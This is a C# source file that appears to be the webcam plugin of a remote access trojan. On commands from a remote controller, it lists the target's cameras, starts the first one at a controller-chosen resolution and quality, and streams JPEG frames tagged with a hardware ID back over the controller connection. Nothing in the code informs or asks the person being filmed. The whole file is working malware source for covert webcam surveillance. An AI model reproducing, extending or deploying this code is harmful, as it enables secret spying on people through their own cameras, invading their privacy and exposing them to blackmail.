using AForge.Video;
using AForge.Video.DirectShow;
using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static bool IsOk = false;
        public static VideoCaptureDevice FinalVideo;
        private static MemoryStream Camstream = new MemoryStream();
        private static int Quality = 50;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "webcam":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getWebcams":
                                    {
                                        GetWebcams();
                                        break;
                                    }

                                case "capture":
                                    {
                                        if (IsOk == true) return;
                                            IsOk = true;
                                            FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                                            FinalVideo = new VideoCaptureDevice(videoCaptureDevices[0].MonikerString);
                                            Quality = (int)unpack_msgpack.ForcePathObject("Quality").AsInteger;
                                            FinalVideo.NewFrame += CaptureRun;
                                            FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[unpack_msgpack.ForcePathObject("List").AsInteger];
                                            FinalVideo.Start();
                                        break;
                                    }

                                case "stop":
                                    {
                                        new Thread(() =>
                                        {
                                            try
                                            {
                                                CaptureDispose();
                                            }
                                            catch { }
                                        }).Start();
                                        break;
                                    }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Webcam switch" + ex.Message);
            }
        }

        private static void CaptureRun(object sender, NewFrameEventArgs e)
        {
            try
            {
                if (Connection.IsConnected)
                {
                    if (IsOk == true)
                    {
                        Bitmap image = (Bitmap)e.Frame.Clone();
                        using (Camstream = new MemoryStream())
                        {
                            System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                            EncoderParameters myEncoderParameters = new EncoderParameters(1);
                            EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, Quality);
                            myEncoderParameters.Param[0] = myEncoderParameter;
                            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                            image.Save(Camstream, jpgEncoder, myEncoderParameters);
                            myEncoderParameters?.Dispose();
                            myEncoderParameter?.Dispose();
                            image?.Dispose();

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "webcam";
                            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Command").AsString = "capture";
                            msgpack.ForcePathObject("Image").SetAsBytes(Camstream.ToArray());
                            Connection.Send(msgpack.Encode2Bytes());
                            Thread.Sleep(1);
                        }
                    }
                }
                else
                {
                    new Thread(() =>
                    {
                        try
                        {
                            CaptureDispose();
                            Connection.Disconnected();
                        }
                        catch { }
                    }).Start();
                }
            }
            catch (Exception ex)
            {
                new Thread(() =>
                {
                    try
                    {
                        CaptureDispose();
                        Connection.Disconnected();
                    }
                    catch { }
                }).Start();
                Debug.WriteLine("CaptureRun: " + ex.Message);
            }
        }

        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        public static void GetWebcams()
        {
            try
            {
                StringBuilder deviceInfo = new StringBuilder();
                FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                {
                    deviceInfo.Append(videoCaptureDevice.Name + "-=>");
                    VideoCaptureDevice device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                    Debug.WriteLine(videoCaptureDevice.Name);
                }
                MsgPack msgpack = new MsgPack();
                if (deviceInfo.Length > 0)
                {
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                    msgpack.ForcePathObject("List").AsString = deviceInfo.ToString();
                }
                else
                {
                    msgpack.ForcePathObject("Packet").AsString = "webcam";
                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                    msgpack.ForcePathObject("List").AsString = "None-=>";
                }
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

        private static void CaptureDispose()
        {
            try
            {
                IsOk = false;
                FinalVideo.Stop();
                FinalVideo.NewFrame -= CaptureRun;
                Camstream?.Dispose();
            }
            catch { }
        }
    }
}
